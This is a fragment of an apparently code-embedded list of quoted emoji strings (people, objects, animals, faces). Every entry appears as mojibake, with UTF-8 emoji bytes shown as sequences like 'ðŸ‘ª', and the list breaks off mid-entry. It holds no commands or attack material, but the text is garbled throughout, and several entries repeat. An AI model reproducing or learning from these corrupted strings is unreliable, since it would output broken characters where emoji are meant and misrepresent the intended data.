'ðŸ‘ª', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸµ', 'ðŸ°', 'ðŸ’', 'ðŸ¦', 'ðŸ¦§', 'ðŸ¶', 'ðŸ•', 'ðŸ¦®', "ðŸ•â€ðŸ¦º", 'ðŸ©', 'ðŸº', 'ðŸ¦Š', 'ðŸ¦', 'ðŸ±', 'ðŸˆ', "ðŸˆâ€â¬›", 'ðŸ¦', 'ðŸ¯', 'ðŸ…', 'ðŸ†', 'ðŸ´', 'ðŸŽ', 'ðŸ¦„', 'ðŸ¦“', 'ðŸ¦Œ', 'ðŸ¦¬', 'ðŸ®', 'ðŸ‚', 'ðŸƒ', 'ðŸ„', 'ðŸ·', 'ðŸ–', 'ðŸ—', 'ðŸ½', 'ðŸ', 'ðŸ‘', 'ðŸ', 'ðŸª', 'ðŸ«', 'ðŸ¦™', 'ðŸ¦’', 'ðŸ˜', 'ðŸ¦£', 'ðŸ¦', 'ðŸ¦›', 'ðŸ­', 'ðŸ', 'ðŸ€', 'ðŸ¹', 'ðŸ°', 'ðŸ‡', "ðŸ¿ï¸", 'ðŸ¦«', 'ðŸ¦”', 'ðŸ¦‡', 'ðŸ»', "ðŸ»â€â„ï¸", 'ðŸ¨', 'ðŸ¼', 'ðŸ¦¥', 'ðŸ¦¦', 'ðŸ¦¨', 'ðŸ¦˜', 'ðŸ¦¡', 'ðŸ¾', 'ðŸ¦ƒ', 'ðŸ”', 'ðŸ“', 'ðŸ£', 'ðŸ¤', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', "ðŸ•Šï¸", 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦¢', 'ðŸ¦‰', 'ðŸ¦¤', 'ðŸª¶', 'ðŸ¦©', 'ðŸ¦š', 'ðŸ¦œ', 'ðŸ¸', 'ðŸŠ', 'ðŸ¢', 'ðŸ¦Ž', 'ðŸ', 'ðŸ²', 'ðŸ‰', 'ðŸ¦•', 'ðŸ¦–', 'ðŸ³', 'ðŸ‹', 'ðŸ¬', 'ðŸ¦­', 'ðŸŸ', 'ðŸ ', 'ðŸ˜€', 'ðŸ˜ƒ', 'ðŸ˜„', 'ðŸ˜', 'ðŸ˜†', 'ðŸ˜…', 'ðŸ¤£', 'ðŸ˜‚', 'ðŸ™‚', 'ðŸ™ƒ', 'ðŸ˜‰', 'ðŸ˜Š', 'ðŸ˜‡', 'ðŸ¥°', 'ðŸ˜', 'ðŸ¤©', 'ðŸ˜˜', 'ðŸ˜—', 'â˜ºï¸', 'ðŸ˜š', 'ðŸ˜™', 'ðŸ¥²', 'ðŸ˜‹', 'ðŸ˜›', 'ðŸ˜œ', 'ðŸ¤ª', 'ðŸ˜', 'ðŸ¤‘', 'ð
